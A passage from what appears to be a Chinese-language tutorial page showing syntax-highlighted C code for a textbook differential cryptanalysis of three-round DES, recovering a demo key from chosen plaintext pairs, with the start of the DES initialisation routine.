class="token function">expand</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">,</span> S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pair %d 3rd round S box input:\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_array</span><span class="token punctuation">(</span>S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_array</span><span class="token punctuation">(</span>S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">/* Initial J matrix. */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">64</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> J<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token comment">/* */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* input diff of S box in 3rd round */</span>      S3inDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* input and output diff of chosen pairs, actually we only need the      * left 4 bytes of input and right 4 bytes of output. */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           inDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> plain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> plain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      outDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/* L0 XOR R3 */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      T<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> outDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/* use L0 XOR R3 to get S box output diff of 3rd round */</span>    <span class="token function">perm32</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> rp32<span class="token punctuation">,</span> S3outDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The 3rd-round S box input diff of pair %d:\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_array</span><span class="token punctuation">(</span>S3inDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The 3rd round S box output diff of pair %d:\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_array</span><span class="token punctuation">(</span>S3outDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* test J matrix use S box input and output diff */</span>    <span class="token function">test_j</span><span class="token punctuation">(</span>S3inDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S3outDiff<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">/* Print the J matrix. */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"J%d: \n"</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">64</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>j<span class="token operator">%</span><span class="token number">16</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>j<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>J<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* use key to temporarily store subkey in 8 chars for each S box */</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>J<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> sub_key3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* generate the sub key(48 bits) of 3rd round from the stored 64 bits. */</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sub_key3<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfc</span><span class="token punctuation">;</span>    sub_key3<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x03</span><span class="token punctuation">;</span>    sub_key3<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">;</span>    sub_key3<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>    sub_key3<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xc0</span><span class="token punctuation">;</span>    sub_key3<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sub key of 3rd round(48 bits):\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">print_array</span><span class="token punctuation">(</span>sub_key3<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* get the key from sub key of 3rd round */</span>  <span class="token function">get_key</span><span class="token punctuation">(</span>sub_key3<span class="token punctuation">,</span> key<span class="token punctuation">,</span> unknown_bit<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Cracked key of the encryption(64 bits):\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">print_array</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> BIN_M<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The unknown bit number of the cracked key:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">print_array</span><span class="token punctuation">(</span>unknown_bit<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> DEC_M<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* End of DC algorithm */</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">/* key for encryption */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x46</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">/* Chosen plaintext pairs. */</span> <span class="token comment">//三对 明文对</span>  <span class="token keyword">struct</span> <span class="token class-name">text_pair</span> in<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">{</span>      <span class="token punctuation">{</span><span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token punctuation">{</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token punctuation">{</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xda</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span><span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">text_pair</span> out<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* Store ciphertext. */</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>  <span class="token function">desinit</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* set up tables for DES  */</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KEY: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">print_array</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> HEX_M<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEncryption start...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">/* encryption */</span>    <span class="token function">endes</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> NO_IP<span class="token punctuation">,</span> NO_LAST_SWAP<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">endes</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">,</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> NO_IP<span class="token punctuation">,</span> NO_LAST_SWAP<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pair %d encryption result:\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_des</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span>out<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span> HEX_M<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_des</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span>out<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">,</span> HEX_M<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">crack_3round</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//选择最大的差分路径。</span><span class="token comment">//类型转换</span><span class="token comment">//如何知道猜出的密钥是对的 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化函数desinit()</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* initialize all des arrays  */</span><span class="token keyword">void</span> <span class="token function">desinit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>  <span class="token function">perminit</span><span class="token punctuation">(</span>Iperm<span class="token punctuation">,</span>I<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/* identical permutation */</span><span class="token comment">//恒等置换</span>  <span class="token function">perminit</span><span class="token punctuation">(</span>iperm<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* initial permutation */</span><span class="token comment">//</span>  <span class="token function">perminit</span><span class="token punctuation">(</span>fperm<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* final permutation */</span>  <span class="token function">kinit</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">/* key schedule */</span>  <span class="token function">sinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* compression functions */</span>  <span class="token function">p32init</span><span class="token punctuation">(</span>p32<span class="token punctuation">,</span> p32i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 32-bit permutation in f */</span>  <span class="token function">p32init</span><span class="token punctuation">(</span>rp32<span class="token punctuation">,</span> rp32i<span class="token punctuation">)</span><span class="token 